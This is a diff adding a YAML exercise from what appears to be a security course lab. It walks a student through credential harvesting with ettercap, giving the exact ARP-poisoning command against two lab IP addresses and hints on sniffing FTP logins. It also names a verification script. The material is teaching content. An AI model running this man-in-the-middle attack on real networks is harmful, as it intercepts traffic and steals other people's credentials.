@@ -1,0 +1,18 @@
+id: "04"
+title: "Credential harvest with ettercap"
+prompt: |
+  ettercap automates the MITM + sniff combo.
+
+  1. Run ettercap in text mode on your docker interface against the lab:
+     sudo ettercap -T -i <iface> -M arp:remote /172.16.10.11/ /172.16.10.10/
+     (run ~30s, Ctrl+C)
+  2. If any credentials appear (FTP login during the MITM), save the
+     console output to ~/kali-class-work/sec-wk11/ettercap.txt
+  3. Stamp: kali-class stamp sec-wk11 ettercap
+hints:
+  - "ettercap -T = text mode; -M arp:remote sets bidirectional ARP poisoning."
+  - "Generate FTP traffic while ettercap runs so creds flow through you."
+verify:
+  script: "04-ettercap.verify.sh"
+  timeout: 90
+on_success: "Automated MITM: poisoning + sniffing in one command."
